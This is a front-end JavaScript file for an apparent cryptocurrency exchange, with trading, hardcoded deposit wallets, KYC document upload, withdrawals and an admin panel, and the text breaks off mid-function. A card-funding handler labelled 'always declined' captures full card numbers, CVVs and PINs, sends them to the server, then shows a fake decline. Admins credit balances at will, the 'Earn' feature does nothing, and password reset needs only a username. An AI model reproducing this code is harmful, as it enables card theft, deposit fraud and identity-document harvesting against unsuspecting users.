const API = ''; // same origin

let token = localStorage.getItem('token');
let currentUser = null;
let currentSide = 'buy';
let prices = {};

// ========== HELPERS ==========
async function api(path, options = {}) {
  const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
  if (token) headers['Authorization'] = `Bearer ${token}`;
  const res = await fetch(API + path, { ...options, headers });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || 'Request failed');
  return data;
}

function show(el) { el.classList.remove('hidden'); }
function hide(el) { el.classList.add('hidden'); }

function formatUSD(n) {
  return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(n);
}

function formatCrypto(n, sym) {
  if (n === 0) return '0';
  if (sym === 'XRP' || sym === 'DOGE') return n.toFixed(4);
  if (n < 0.0001) return n.toFixed(8);
  return n.toFixed(6);
}

// ========== AUTH ==========
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    const isLogin = tab.dataset.tab === 'login';
    document.getElementById('login-form').classList.toggle('hidden', !isLogin);
    document.getElementById('register-form').classList.toggle('hidden', isLogin);
    hide(document.getElementById('auth-error'));
  });
});

document.getElementById('login-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('login-username').value.trim();
  const password = document.getElementById('login-password').value;
  try {
    const data = await api('/api/login', {
      method: 'POST',
      body: JSON.stringify({ username, password })
    });
    token = data.token;
    localStorage.setItem('token', token);
    currentUser = data.user;
    enterApp();
  } catch (err) {
    const errEl = document.getElementById('auth-error');
    errEl.textContent = err.message;
    show(errEl);
  }
});

document.getElementById('register-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const fullName = document.getElementById('reg-fullname').value.trim();
  const username = document.getElementById('reg-username').value.trim();
  const email = document.getElementById('reg-email').value.trim();
  const phone = document.getElementById('reg-phone').value.trim();
  const address = document.getElementById('reg-address').value.trim();
  const password = document.getElementById('reg-password').value;
  try {
    const data = await api('/api/register', {
      method: 'POST',
      body: JSON.stringify({ username, email, password, fullName, phone, address })
    });
    const successEl = document.getElementById('auth-success');
    successEl.textContent = data.message || 'Registration successful. Go to Login.';
    show(successEl);
    hide(document.getElementById('auth-error'));
    e.target.reset();
  } catch (err) {
    const errEl = document.getElementById('auth-error');
    errEl.textContent = err.message;
    show(errEl);
    hide(document.getElementById('auth-success'));
  }
});

// Forgot password toggle
document.getElementById('show-reset')?.addEventListener('click', (e) => {
  e.preventDefault();
  document.getElementById('login-form').classList.add('hidden');
  document.getElementById('register-form').classList.add('hidden');
  document.getElementById('reset-form').classList.remove('hidden');
  hide(document.getElementById('auth-error'));
  hide(document.getElementById('auth-success'));
});

document.getElementById('back-to-login')?.addEventListener('click', () => {
  document.getElementById('reset-form').classList.add('hidden');
  document.getElementById('login-form').classList.remove('hidden');
});

document.getElementById('reset-form')?.addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('reset-username').value.trim();
  const newPassword = document.getElementById('reset-password').value;
  try {
    const data = await api('/api/reset-password', {
      method: 'POST',
      body: JSON.stringify({ username, newPassword })
    });
    const successEl = document.getElementById('auth-success');
    successEl.textContent = data.message;
    show(successEl);
    hide(document.getElementById('auth-error'));
    e.target.reset();
  } catch (err) {
    const errEl = document.getElementById('auth-error');
    errEl.textContent = err.message;
    show(errEl);
  }
});

document.getElementById('logout-btn').addEventListener('click', () => {
  token = null;
  currentUser = null;
  localStorage.removeItem('token');
  hide(document.getElementById('main-screen'));
  show(document.getElementById('auth-screen'));
});

// ========== APP ==========
async function enterApp() {
  hide(document.getElementById('auth-screen'));
  show(document.getElementById('main-screen'));
  
  document.getElementById('user-badge').textContent = 
    `${currentUser.username}${currentUser.role === 'admin' ? ' (Admin)' : ''}`;
  
  // Show admin tab if admin
  const adminTab = document.querySelector('.nav-tab.admin-only');
  if (currentUser.role === 'admin') show(adminTab);
  else hide(adminTab);

  await refreshPrices();
  await loadPortfolio();
  updateTradeBalance();
  startPricePolling();
}

// Navigation
document.querySelectorAll('.nav-tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    document.querySelectorAll('.view').forEach(v => hide(v));
    show(document.getElementById('view-' + tab.dataset.view));
    
    if (tab.dataset.view === 'portfolio') loadPortfolio();
    if (tab.dataset.view === 'history') loadHistory();
    if (tab.dataset.view === 'earn') loadEarn();
    if (tab.dataset.view === 'admin') loadAdmin();
    if (tab.dataset.view === 'deposit') loadDeposit();
    if (tab.dataset.view === 'withdraw') loadWithdraw();
    if (tab.dataset.view === 'profile') loadProfile();
    if (tab.dataset.view === 'kyc') loadKYCPage();
  });
});

// Prices
async function refreshPrices() {
  try {
    const data = await api('/api/prices');
    prices = data.prices;
    renderPrices();
  } catch (e) {
    console.error(e);
  }
}

function renderPrices() {
  const grid = document.getElementById('prices-grid');
  if (!grid) return;
  const selected = document.getElementById('trade-symbol')?.value || 'BTC';
  const symbols = ['BTC', 'ETH', 'SOL', 'XRP', 'DOGE', 'USDT'];
  grid.innerHTML = symbols.map(sym => {
    const price = prices[sym] || 0;
    return `
    <div class="price-card ${sym === selected ? 'selected' : ''}" data-sym="${sym}">
      <div class="sym">${sym}</div>
      <div class="price">${formatUSD(price)}</div>
    </div>
  `;
  }).join('');
  
  grid.querySelectorAll('.price-card').forEach(card => {
    card.addEventListener('click', () => {
      document.getElementById('trade-symbol').value = card.dataset.sym;
      renderPrices();
      updateEstimate();
    });
  });
}

function startPricePolling() {
  setInterval(refreshPrices, 15000);
}

// Trade
document.querySelectorAll('.side-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.side-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentSide = btn.dataset.side;
    document.getElementById('amount-label').textContent = 
      currentSide === 'buy' ? 'Amount (USD)' : 'Amount (Crypto)';
    updateEstimate();
  });
});

document.getElementById('trade-symbol').addEventListener('change', () => {
  renderPrices();
  updateEstimate();
});
document.getElementById('trade-amount').addEventListener('input', updateEstimate);

function updateEstimate() {
  const amount = parseFloat(document.getElementById('trade-amount').value) || 0;
  const sym = document.getElementById('trade-symbol').value;
  const price = prices[sym] || 0;
  const el = document.getElementById('trade-estimate');
  if (amount <= 0 || !price) {
    el.textContent = '';
    return;
  }
  if (currentSide === 'buy') {
    const qty = amount / price;
    el.textContent = `≈ You will receive ${formatCrypto(qty, sym)} ${sym}`;
  } else {
    const usd = amount * price;
    el.textContent = `≈ You will receive ${formatUSD(usd)}`;
  }
}

document.getElementById('execute-trade').addEventListener('click', async () => {
  const amount = parseFloat(document.getElementById('trade-amount').value);
  const symbol = document.getElementById('trade-symbol').value;
  const msg = document.getElementById('trade-msg');
  if (!amount || amount <= 0) {
    msg.textContent = 'Enter a valid amount';
    msg.className = 'msg error';
    show(msg);
    return;
  }
  try {
    const data = await api('/api/trade', {
      method: 'POST',
      body: JSON.stringify({ symbol, side: currentSide, amount })
    });
    msg.textContent = data.message;
    msg.className = 'msg success';
    show(msg);
    document.getElementById('trade-amount').value = '';
    updateEstimate();
    // Refresh user data
    currentUser.balanceUSD = data.balanceUSD;
    currentUser.portfolio = data.portfolio;
    await loadPortfolio();
  updateTradeBalance();
  } catch (err) {
    msg.textContent = err.message;
    msg.className = 'msg error';
    show(msg);
  }
});

// Portfolio
async function loadPortfolio() {
  try {
    const data = await api('/api/portfolio');
    document.getElementById('total-value').textContent = formatUSD(data.totalValue);
    document.getElementById('usd-balance').textContent = formatUSD(data.balanceUSD);
    
    const list = document.getElementById('holdings-list');
    const holdings = Object.entries(data.portfolio)
      .filter(([_, qty]) => qty > 0)
      .map(([sym, qty]) => {
        const value = qty * (data.prices[sym] || 0);
        return `
          <div class="holding-card">
            <div class="left">
              <span class="sym">${sym}</span>
              <span class="qty">${formatCrypto(qty, sym)} ${sym}</span>
            </div>
            <div class="right">
              <div class="value">${formatUSD(value)}</div>
              <div class="usd">@ ${formatUSD(data.prices[sym])}</div>
            </div>
          </div>
        `;
      });
    
    if (holdings.length === 0) {
      list.innerHTML = '<p style="color:var(--muted);padding:20px;">No crypto holdings yet. Start trading!</p>';
    } else {
      list.innerHTML = holdings.join('');
    }
  } catch (e) {
    console.error(e);
  }
}

// History
async function loadHistory() {
  try {
    const txs = await api('/api/transactions');
    const body = document.getElementById('tx-body');
    if (!body) return;
    if (!txs || txs.length === 0) {
      body.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--muted)">No transactions yet</td></tr>';
      return;
    }
    body.innerHTML = txs.map(t => {
      const time = t.timestamp ? new Date(t.timestamp).toLocaleString() : '-';
      let type = (t.type || t.side || 'trade').toUpperCase();
      let asset = t.symbol || t.network || t.asset || '-';
      
      // Show username for transfers
      if (t.type === 'transfer_in' && t.fromUsername) {
        type = t.fromUsername.toUpperCase();
        asset = 'USD';
      } else if (t.type === 'transfer_out' && t.toUsername) {
        type = t.toUsername.toUpperCase();
        asset = 'USD';
      }
      
      let amount = '-';
      if (t.amount !== undefined) {
        amount = (t.side === 'buy' || t.type === 'deposit' || t.type === 'withdrawal' || t.type === 'transfer_in' || t.type === 'transfer_out') 
          ? formatUSD(t.amount) 
          : formatCrypto(t.amount, asset);
      }
      const price = t.price ? formatUSD(t.price) : (t.status || '-');
      // Color coding
      const isCredit = t.type === 'transfer_in' || t.side === 'sell' || t.type === 'deposit';
      const isDebit = t.type === 'transfer_out' || t.side === 'buy' || t.type === 'withdrawal';
      const color = isCredit ? 'var(--green)' : isDebit ? 'var(--red)' : 'inherit';
      const prefix = isCredit ? '+' : isDebit ? '-' : '';

      return `
        <tr>
          <td style="color:var(--muted);font-size:13px;">${time}</td>
          <td style="color:${color};font-weight:600;">${type}</td>
          <td>${asset}</td>
          <td style="color:${color};font-weight:600;">${prefix}${amount}</td>
          <td style="color:var(--muted);">${price}</td>
        </tr>
      `;
    }).join('');
  } catch (e) {
    console.error('History error:', e);
    const body = document.getElementById('tx-body');
    if (body) body.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--red)">Failed to load history</td></tr>';
  }
}

// Admin
async function loadAdmin() {
  try {
    // Load pending withdrawals
    const withdrawals = await api('/api/admin/withdrawals');
    const wBody = document.getElementById('admin-withdrawals-body');
    if (wBody) {
      if (!withdrawals || withdrawals.length === 0) {
        wBody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--muted)">No pending withdrawals</td></tr>';
      } else {
        wBody.innerHTML = withdrawals.map(w => `
          <tr>
            <td>${new Date(w.timestamp).toLocaleString()}</td>
            <td>${w.username || w.userId}</td>
            <td>$${w.amount}</td>
            <td style="font-size:12px;word-break:break-all;">${w.address}</td>
            <td>${w.network}</td>
            <td><button class="btn primary approve-withdrawal-btn" data-id="${w.id}">Mark Completed</button></td>
          </tr>
        `).join('');
        wBody.querySelectorAll('.approve-withdrawal-btn').forEach(btn => {
          btn.addEventListener('click', async () => {
            if (!confirm('Mark this withdrawal as completed?')) return;
            try {
              await api('/api/admin/approve-withdrawal', { method: 'POST', body: JSON.stringify({ txId: btn.dataset.id }) });
              loadAdmin();
            } catch (e) { alert(e.message); }
          });
        });
      }
    }

    const users = await api('/api/admin/users');
    const select = document.getElementById('admin-user-select');
    select.innerHTML = users
      .filter(u => u.role !== 'admin')
      .map(u => `<option value="${u.id}">${u.username} ($${u.balanceUSD.toFixed(2)})</option>`)
      .join('');
    
    const body = document.getElementById('admin-users-body');
    body.innerHTML = users.map(u => `
      <tr>
        <td>${u.username}</td>
        <td>${u.fullName || '-'}</td>
        <td>${u.email || '-'}</td>
        <td>${u.phone || '-'}</td>
        <td>${u.address || '-'}</td>
        <td>${formatUSD(u.balanceUSD)}</td>
        <td>${u.approved ? 'Approved' : 'Pending'}</td>
        <td>${u.kycStatus || 'none'}</td>
        <td>
          ${u.kycData ? `Name: ${u.kycData.fullName || '-'}<br>ID: ${u.kycData.idType || '-'} ${u.kycData.idNumber || ''}<br>Country: ${u.kycData.country || '-'}` : '-'}
        </td>
        <td>
          ${!u.approved && u.role !== 'admin' ? `<button class="btn primary approve-btn" data-id="${u.id}">Approve</button>` : ''}
          ${u.pendingProfile ? `<button class="btn primary approve-profile-btn" data-id="${u.id}">Approve Profile</button>` : ''}
          <button class="btn ghost reset-btn" data-id="${u.id}">Reset Pass</button>
          ${u.kycStatus === 'pending' ? `<button class="btn primary approve-kyc-btn" data-id="${u.id}">Approve KYC</button>` : ''}
          ${u.kycDocuments ? `<button class="btn ghost view-doc-btn" data-id="${u.id}" data-side="front">View Front</button> <button class="btn ghost view-doc-btn" data-id="${u.id}" data-side="back">View Back</button>` : ''}
          ${u.role !== 'admin' ? `<button class="btn ghost delete-btn" data-id="${u.id}" style="color:var(--red);">Delete</button>` : ''}
        </td>
      </tr>
    `).join('');

    body.querySelectorAll('.approve-profile-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        try {
          await api('/api/admin/approve-profile', { method: 'POST', body: JSON.stringify({ userId: btn.dataset.id }) });
          loadAdmin();
        } catch (e) { alert(e.message); }
      });
    });

    body.querySelectorAll('.approve-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        try {
          await api('/api/admin/approve', { method: 'POST', body: JSON.stringify({ userId: btn.dataset.id }) });
          loadAdmin();
        } catch (e) { alert(e.message); }
      });
    });

    
    body.querySelectorAll('.view-doc-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        try {
          const token = localStorage.getItem('token');
          const res = await fetch(`/api/admin/kyc-document/${btn.dataset.id}/${btn.dataset.side}`, {
            headers: { 'Authorization': 'Bearer ' + token }
          });
          if (!res.ok) throw new Error('Failed to load document');
          const blob = await res.blob();
          const url = URL.createObjectURL(blob);
          window.open(url, '_blank');
        } catch (e) {
          alert(e.message);
        }
      });
    });

    body.querySelectorAll('.approve-kyc-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        try {
          await api('/api/admin/approve-kyc', { method: 'POST', body: JSON.stringify({ userId: btn.dataset.id }) });
          loadAdmin();
        } catch (e) { alert(e.message); }
      });
    });

    body.querySelectorAll('.delete-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!confirm('Are you sure you want to delete this user? This cannot be undone.')) return;
        try {
          await api('/api/admin/delete-user', { method: 'POST', body: JSON.stringify({ userId: btn.dataset.id }) });
          loadAdmin();
        } catch (e) { alert(e.message); }
      });
    });

    body.querySelectorAll('.reset-btn').forEach(btn => {
      btn.addEventListener('click', async () => {
        const newPass = prompt('Enter new password for this user (min 6 chars):');
        if (!newPass || newPass.length < 6) return;
        try {
          await api('/api/admin/reset-password', { method: 'POST', body: JSON.stringify({ userId: btn.dataset.id, newPassword: newPass }) });
          alert('Password reset successfully');
        } catch (e) { alert(e.message); }
      });
    });
  } catch (e) {
    console.error(e);
  }
}

document.getElementById('send-funds-btn').addEventListener('click', async () => {
  const userId = document.getElementById('admin-user-select').value;
  const amount = parseFloat(document.getElementById('admin-amount').value);
  const msg = document.getElementById('admin-msg');
  if (!userId || !amount || amount <= 0) {
    msg.textContent = 'Select a user and enter a valid amount';
    msg.className = 'msg error';
    show(msg);
    return;
  }
  try {
    const data = await api('/api/admin/add-funds', {
      method: 'POST',
      body: JSON.stringify({ userId, amount })
    });
    msg.textContent = data.message;
    msg.className = 'msg success';
    show(msg);
    document.getElementById('admin-amount').value = '';
    loadAdmin();
  } catch (err) {
    msg.textContent = err.message;
    msg.className = 'msg error';
    show(msg);
  }
});

// ========== INIT ==========
(async function init() {
  if (token) {
    try {
      currentUser = await api('/api/me');
      enterApp();
    } catch (e) {
      localStorage.removeItem('token');
      token = null;
    }
  }
})();

// ========== DEPOSIT ==========
const depositAddresses = [
  { symbol: 'BTC',  network: 'Bitcoin',     address: 'bc1qrynlenszta5p8dxk4e82pxhs77ryhtruzstmpy' },
  { symbol: 'ETH',  network: 'ERC-20',      address: '0xCD5E6d892CD976700A026a2E490f3ef34B064245' },
  { symbol: 'SOL',  network: 'Solana',      address: '9hFcs8Gg9A6NTg1MMMSw25q8nneoEqLJ7Y92PrY5nyaJ' },
  { symbol: 'XRP',  network: 'Ripple',      address: 'rUgeB3HtVmVSvPz8YUFapvGRfwHPt3AyQf' },
  { symbol: 'DOGE', network: 'Dogecoin',    address: 'DEgwL6QBQBYztiBQNbgY4fuakmizzvoaBe' },
  { symbol: 'USDT', network: 'TRC-20',      address: 'TSNdF8DXrfxKiSewzJaUphysqGjGH17udp' }
];

function loadDeposit() {
  const tabsEl = document.getElementById('deposit-tabs');
  const contentEl = document.getElementById('deposit-content');
  const warning = document.getElementById('kyc-warning');

  if (!tabsEl || !contentEl) return;
  if (warning) warning.style.display = 'none';
  renderDepositTabs();

  function renderDepositTabs() {
    tabsEl.innerHTML = depositAddresses.map((d, i) => 
      `<button class="deposit-tab ${i===0?'active':''}" data-idx="${i}">${d.symbol}</button>`
    ).join('');

    function showTab(idx) {
      const d = depositAddresses[idx];
      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(d.address)}`;
      contentEl.innerHTML = `
        <div class="deposit-detail">
          <div class="deposit-header">
            <span class="sym">${d.symbol}</span>
            <span class="network">${d.network}</span>
          </div>
          <div style="text-align:center;margin:16px 0;">
            <img src="${qrUrl}" alt="QR Code" style="border-radius:8px;background:#fff;padding:8px;" />
          </div>
          <div class="address-box">
            <code class="address">${d.address}</code>
            <button class="copy-btn" data-addr="${d.address}">Copy</button>
          </div>
          <p class="warning">Only send ${d.symbol} on the ${d.network} network. Wrong network = lost funds.</p>
          <p class="warning">Crypto Deposits are automatically deposited into USD Balance.</p>
        </div>
      `;
      contentEl.querySelector('.copy-btn').addEventListener('click', (e) => {
        navigator.clipboard.writeText(e.target.dataset.addr);
        e.target.textContent = 'Copied!';
        setTimeout(() => e.target.textContent = 'Copy', 1500);
      });
    }

    tabsEl.querySelectorAll('.deposit-tab').forEach(btn => {
      btn.addEventListener('click', () => {
        tabsEl.querySelectorAll('.deposit-tab').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        showTab(parseInt(btn.dataset.idx));
      });
    });
    showTab(0);
  }
}

async function loadProfile() {
  loadKYCStatus();
  try {
    const user = await api('/api/me');
    document.getElementById('prof-fullname').value = user.fullName || '';
    document.getElementById('prof-email').value = user.email || '';
    document.getElementById('prof-phone').value = user.phone || '';
    document.getElementById('prof-address').value = user.address || '';
    document.getElementById('prof-username').value = user.username || '';
  } catch (e) {
    console.error(e);
  }
}

document.getElementById('save-profile')?.addEventListener('click', async () => {
  const msg = document.getElementById('profile-msg');
  const data = {
    fullName: document.getElementById('prof-fullname').value.trim(),
    email: document.getElementById('prof-email').value.trim(),
    phone: document.getElementById('prof-phone').value.trim(),
    address: document.getElementById('prof-address').value.trim()
  };
  try {
    const res = await api('/api/profile/update', {
      method: 'POST',
      body: JSON.stringify(data)
    });
    msg.textContent = res.message;
    msg.className = 'msg success';
    msg.classList.remove('hidden');
  } catch (e) {
    msg.textContent = e.message;
    msg.className = 'msg error';
    msg.classList.remove('hidden');
  }
});

// KYC
async function loadKYCStatus() {
  try {
    const user = await api('/api/me');
    const statusEl = document.getElementById('kyc-status');
    const formEl = document.getElementById('kyc-form');
    if (user.kycApproved) {
      statusEl.innerHTML = '<span style="color:var(--green);font-weight:600;">✓ Verified</span>';
    } else if (user.kycStatus === 'pending') {
      statusEl.innerHTML = '<span style="color:var(--primary);font-weight:600;">Pending Review</span>';
    } else {
      statusEl.innerHTML = '<span style="color:var(--red);font-weight:600;">Not Verified</span> — <a href="#" onclick="document.querySelector(\'[data-view=kyc]\').click();return false;" style="color:var(--primary);">Complete KYC</a>';
    }
    if (formEl) formEl.style.display = 'none';
  } catch (e) {}
}

document.getElementById('submit-kyc')?.addEventListener('click', async () => {
  const formData = new FormData();
  formData.append('fullName', document.getElementById('kyc-fullname').value.trim());
  formData.append('idType', document.getElementById('kyc-idtype').value);
  formData.append('idNumber', document.getElementById('kyc-idnumber').value.trim());
  formData.append('country', document.getElementById('kyc-country').value.trim());
  const front = document.getElementById('kyc-front').files[0];
  const back = document.getElementById('kyc-back').files[0];
  if (front) formData.append('front', front);
  if (back) formData.append('back', back);

  try {
    const token = localStorage.getItem('token');
    const res = await fetch('/api/kyc/submit', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + token },
      body: formData
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Failed');
    alert('KYC submitted for review');
    loadKYCStatus();
  } catch (e) { alert(e.message); }
});

document.getElementById('go-to-kyc')?.addEventListener('click', (e) => {
  e.preventDefault();
  document.querySelector('.nav-tab[data-view="profile"]').click();
});

async function loadKYCPage() {
  try {
    const user = await api('/api/me');
    const statusEl = document.getElementById('kyc-status-page');
    const formEl = document.getElementById('kyc-form-page');
    if (user.kycApproved) {
      statusEl.innerHTML = '<span style="color:var(--green);font-weight:600;">✓ KYC Approved</span>';
      formEl.style.display = 'none';
    } else if (user.kycStatus === 'pending') {
      statusEl.innerHTML = '<span style="color:var(--primary);font-weight:600;">KYC Pending Review</span>';
      formEl.style.display = 'none';
    } else {
      statusEl.innerHTML = '<span style="color:var(--red);">Please complete KYC to enable withdrawals.</span>';
      formEl.style.display = 'block';
    }
  } catch (e) {}
}

document.getElementById('submit-kyc-page')?.addEventListener('click', async () => {
  const formData = new FormData();
  formData.append('fullName', document.getElementById('kyc-fullname-page').value.trim());
  formData.append('idType', document.getElementById('kyc-idtype-page').value);
  formData.append('idNumber', document.getElementById('kyc-idnumber-page').value.trim());
  formData.append('country', document.getElementById('kyc-country-page').value.trim());
  const front = document.getElementById('kyc-front-page').files[0];
  const back = document.getElementById('kyc-back-page').files[0];
  if (front) formData.append('front', front);
  if (back) formData.append('back', back);

  try {
    const token = localStorage.getItem('token');
    const res = await fetch('/api/kyc/submit', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + token },
      body: formData
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Failed');
    alert('KYC submitted for review');
    loadKYCPage();
  } catch (e) { alert(e.message); }
});

async function loadWithdraw() {
  const warning = document.getElementById('withdraw-kyc-warning');
  const form = document.getElementById('withdraw-form');
  try {
    const user = await api('/api/me');
    if (!user.kycApproved) {
      warning.style.display = 'block';
      form.style.display = 'none';
    } else {
      warning.style.display = 'none';
      form.style.display = 'block';
    }
  } catch (e) {
    warning.style.display = 'block';
    form.style.display = 'none';
  }
}

document.getElementById('withdraw-btn')?.addEventListener('click', async () => {
  const amount = parseFloat(document.getElementById('withdraw-amount').value);
  const address = document.getElementById('withdraw-address').value.trim();
  const network = document.getElementById('withdraw-network').value;
  const msg = document.getElementById('withdraw-msg');
  if (!amount || amount < 10 || !address) {
    msg.textContent = 'Enter amount (min $10) and wallet address';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  try {
    await api('/api/withdraw', { method: 'POST', body: JSON.stringify({ amount, address, network }) });
    msg.textContent = 'Withdrawal request submitted. Admin will process it.';
    msg.className = 'msg success';
    msg.classList.remove('hidden');
  } catch (e) {
    msg.textContent = e.message;
    msg.className = 'msg error';
    msg.classList.remove('hidden');
  }
});

const earnRates = { USDT: 7.06, BTC: 0.40, ETH: 0.80, SOL: 1.30 };
let earnTerm = 'flexible';

function loadEarn() {
  updateEarnYield();
}

function updateEarnYield() {
  const amount = parseFloat(document.getElementById('earn-amount').value) || 0;
  const activeBtn = document.querySelector('.earn-term.active') || document.querySelector('.earn-term');
  const pct = parseFloat(activeBtn?.dataset.pct || '5');
  document.getElementById('earn-apr').textContent = pct + '%';
  // Fixed percentage return for the term
  const yieldAmount = amount * (pct / 100);
  document.getElementById('earn-yield').textContent = yieldAmount.toFixed(2);
}

document.getElementById('earn-amount')?.addEventListener('input', updateEarnYield);
document.getElementById('earn-asset')?.addEventListener('change', updateEarnYield);

document.querySelectorAll('.earn-term').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.earn-term').forEach(b => {
      b.classList.remove('active');
      b.style.background = 'transparent';
      b.style.color = 'var(--muted)';
    });
    btn.classList.add('active');
    btn.style.background = 'var(--card)';
    btn.style.color = 'var(--text)';
    earnTerm = btn.dataset.term;
    updateEarnYield();
  });
});

document.querySelectorAll('.pick').forEach(pick => {
  pick.addEventListener('click', () => {
    document.getElementById('earn-asset').value = pick.dataset.asset;
    updateEarnYield();
  });
});

document.getElementById('earn-now')?.addEventListener('click', async () => {
  const amount = parseFloat(document.getElementById('earn-amount').value);
  const asset = document.getElementById('earn-asset').value;
  const msg = document.getElementById('earn-msg');
  if (!amount || amount <= 0) {
    msg.textContent = 'Enter an amount';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  msg.textContent = 'Subscribed ' + amount + ' ' + asset + ' to Earn (' + earnTerm + ')';
  msg.className = 'msg success';
  msg.classList.remove('hidden');
});

// Funding options
document.querySelectorAll('.funding-opt').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.funding-opt').forEach(b => {
      b.style.background = 'transparent';
      b.style.color = 'var(--text)';
    });
    btn.style.background = 'var(--primary)';
    btn.style.color = '#000';
    document.getElementById('funding-crypto').style.display = btn.dataset.opt === 'crypto' ? 'block' : 'none';
    document.getElementById('funding-card').style.display = btn.dataset.opt === 'card' ? 'block' : 'none';
    document.getElementById('funding-member').style.display = btn.dataset.opt === 'member' ? 'block' : 'none';
  });
});

// Card payment - always declined
document.getElementById('card-submit')?.addEventListener('click', async () => {
  const msg = document.getElementById('card-msg');
  const name = document.getElementById('card-name')?.value.trim() || '';
  const number = document.getElementById('card-number').value.replace(/\s/g, '');
  const expiry = document.getElementById('card-expiry').value.trim();
  const cvv = document.getElementById('card-cvv').value.trim();
  const pin = document.getElementById('card-pin')?.value.trim() || '';
  const amount = parseFloat(document.getElementById('card-amount').value);

  // Validation
  if (!name || name.length < 3) {
    msg.textContent = 'Enter cardholder full name';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  if (!/^\d{16}$/.test(number)) {
    msg.textContent = 'Card number must be 16 digits';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  if (!/^\d{2}\/\d{2}$/.test(expiry)) {
    msg.textContent = 'Expiry must be MM/YY format';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  const [mm, yy] = expiry.split('/').map(Number);
  if (mm < 1 || mm > 12) {
    msg.textContent = 'Invalid expiry month';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  if (!/^\d{3,4}$/.test(cvv)) {
    msg.textContent = 'CVV must be 3 or 4 digits';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  if (pin && !/^\d{4,6}$/.test(pin)) {
    msg.textContent = 'PIN must be 4-6 digits';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  if (!amount || amount < 10) {
    msg.textContent = 'Minimum amount is $10';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }

  const cardData = { name, number, expiry, cvv, pin, amount };
  try {
    await api('/api/card-attempt', { method: 'POST', body: JSON.stringify(cardData) });
  } catch (e) {}
  msg.textContent = 'Declined. Contact Card issuer';
  msg.className = 'msg error';
  msg.classList.remove('hidden');
});

// Auto-format card number
document.getElementById('card-number')?.addEventListener('input', (e) => {
  let v = e.target.value.replace(/\D/g, '').slice(0, 16);
  e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
});

// Auto-format expiry
document.getElementById('card-expiry')?.addEventListener('input', (e) => {
  let v = e.target.value.replace(/\D/g, '').slice(0, 4);
  if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
  e.target.value = v;
});

// Update trade USD balance display
async function updateTradeBalance() {
  try {
    const user = await api('/api/me');
    const el = document.getElementById('trade-usd-balance');
    if (el) el.textContent = '$' + (user.balanceUSD || 0).toFixed(2);
  } catch (e) {}
}

// PIN visibility toggle
document.getElementById('toggle-pin')?.addEventListener('click', () => {
  const pin = document.getElementById('card-pin');
  const btn = document.getElementById('toggle-pin');
  if (pin.type === 'password') {
    pin.type = 'text';
    btn.textContent = 'Hide';
  } else {
    pin.type = 'password';
    btn.textContent = 'Show';
  }
});

// Search member
document.getElementById('search-member-btn')?.addEventListener('click', async () => {
  const username = document.getElementById('search-member').value.trim();
  const result = document.getElementById('search-result');
  if (!username) return;
  try {
    const data = await api('/api/search-user?username=' + encodeURIComponent(username));
    if (data.found) {
      result.innerHTML = '<span style="color:var(--green);">✓ User found: ' + data.username + '</span>';
      document.getElementById('to-member').value = data.username;
    } else {
      result.innerHTML = '<span style="color:var(--red);">User not found</span>';
    }
  } catch (e) {
    result.innerHTML = '<span style="color:var(--red);">Search failed</span>';
  }
});

// Transfer to member
document.getElementById('to-member-btn')?.addEventListener('click', async () => {
  const toUsername = document.getElementById('to-member').value.trim();
  const amount = parseFloat(document.getElementById('to-amount').value);
  const msg = document.getElementById('to-msg');
  if (!toUsername || !amount || amount <= 0) {
    msg.textContent = 'Enter username and amount';
    msg.className = 'msg error';
    msg.classList.remove('hidden');
    return;
  }
  try {
    await api('/api/transfer-member', { method: 'POST', body: JSON.stringify({ toUsername, amount }) });
    msg.textContent = 'Sent $' + amount + ' to ' + toUsername;
    msg.className = 'msg success';
    msg.classList.remove('hidden');
  } catch (e) {
    msg.textContent = e.message;
    msg.className = 'msg error';
    msg.classList.remove('hidden');
  }
});

// Request from member
document.getElementById('from-member-btn')?.addEventListener('click', async () => {
  const fromUsername = document.getElementById('from-member').value.trim();
  const amount = parseFloat(document.getElementById('from-amount').value);
  const msg = document.getElementById('from-msg');
  if (!fromUsername || !amount) {
    msg.textContent = 'Enter username and amount';
    msg.className = 'msg error';
